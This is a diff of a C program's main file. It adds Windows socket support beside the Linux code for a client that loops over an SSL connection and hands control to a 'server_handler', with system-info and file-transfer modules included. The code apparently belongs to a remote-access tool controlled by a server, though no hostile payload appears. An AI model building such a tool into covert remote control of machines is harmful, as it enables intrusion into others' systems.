@@ -2,22 +2,30 @@
 #include <stdlib.h>
 #include <stdbool.h>
 #include <string.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <unistd.h>
-#include <stdint.h>
 #include <openssl/ssl.h>
 
+#ifdef _WIN64
+    #include <winsock2.h>
+    #include <ws2tcpip.h>
+    #include <windows.h>
+    #pragma comment(lib, "Ws2_32.lib")
+    #include "Windows/socket.h"
+    #include "Windows/systeminfo.h"
+    #include "Windows/send_receive.h"
+    #include "Windows/file_transfer.h"
+    #else
+    #include "Linux/file_transfer.h"
+    #include "Linux/send_receive.h"
+    #include <netinet/in.h>
+    #include <arpa/inet.h>
+    #include <unistd.h>
+    #include "Linux/socket.h"
+    #include "Linux/systeminfo.h"
+#endif
 
-#include "Generic/send_receive.h"
-#include "Linux/socket.h"
 #include "Generic/string_manipulation.h"
-#include "Linux/systeminfo.h"
 #include "Generic/server_handler.h"
 #include "Generic/hash_file.h"
-#include "Generic/file_transfer.h"
-
 
 int main() {
     while(true) {
@@ -32,6 +40,10 @@ int main() {
         char* sniffer_dummy = receive_data(ssl);
         free(sniffer_dummy);
         server_handler(ssl);
-        close(SSL_get_fd(ssl));
+        #ifdef _WIN64
+            closesocket(SSL_get_fd(ssl));
+        #else
+            close(SSL_get_fd(ssl));
+        #endif
     }
 }
